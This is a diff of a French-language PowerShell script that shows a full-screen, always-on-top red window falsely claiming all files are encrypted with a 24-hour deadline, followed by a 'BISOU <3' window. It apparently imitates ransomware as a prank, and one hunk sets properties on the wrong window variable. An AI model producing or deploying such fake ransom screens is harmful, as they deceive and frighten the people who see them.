@@ -16,9 +16,10 @@ $warningWindow.Content = "TOUS VOS FICHIERS SONT CHIFFRES !`n`n" +
                          "DELAI RESTANT : 24 HEURES SOUS PEINE DE PERDRE VOS FICHIERS DEFINITIVEMENT"
 $warningWindow.FontSize = 32
 # Adapter la taille de la fenêtre en fonction de la taille de l'écran
-$warningWindow.Width = $screenWidth * 0.7  # 70% de la largeur de l'écran
-$warningWindow.Height = $screenHeight * 0.5  # 50% de la hauteur de l'écran
-$warningWindow.WindowStartupLocation = 'CenterScreen'
+$warningWindow.Width = $screenWidth  # 70% de la largeur de l'écran
+$warningWindow.Height = $screenHeight # 50% de la hauteur de l'écran
+$warningWindow.Left = ($screenWidth - $warningWindow.Width) / 2
+$warningWindow.Top = ($screenHeight - $warningWindow.Height) / 2
 $warningWindow.Topmost = $true
 $warningWindow.Background = 'Red'
 $warningWindow.Foreground = 'White'
@@ -30,10 +31,11 @@ $window.Title = 'ALERTE SECURITE'
 $window.Content = 'BISOU <3'
 $window.FontSize = 48
 # Adapter la taille de la fenêtre en fonction de la taille de l'écran
-$window.Width = $screenWidth * 0.8  # 80% de la largeur de l'écran
-$window.Height = $screenHeight * 0.5  # 50% de la hauteur de l'écran
-$window.WindowStartupLocation = 'CenterScreen'
-$window.Topmost = $true
+$window.Width = $screenWidth  # 80% de la largeur de l'écran
+$window.Height = $screenHeight  # 50% de la hauteur de l'écran
+$warningWindow.Left = ($screenWidth - $warningWindow.Width) / 2
+$warningWindow.Top = ($screenHeight - $warningWindow.Height) / 2
+$warningWindow.Topmost = $true
 $window.Background = 'Red'
 $window.Foreground = 'White'
 $window.ShowDialog()
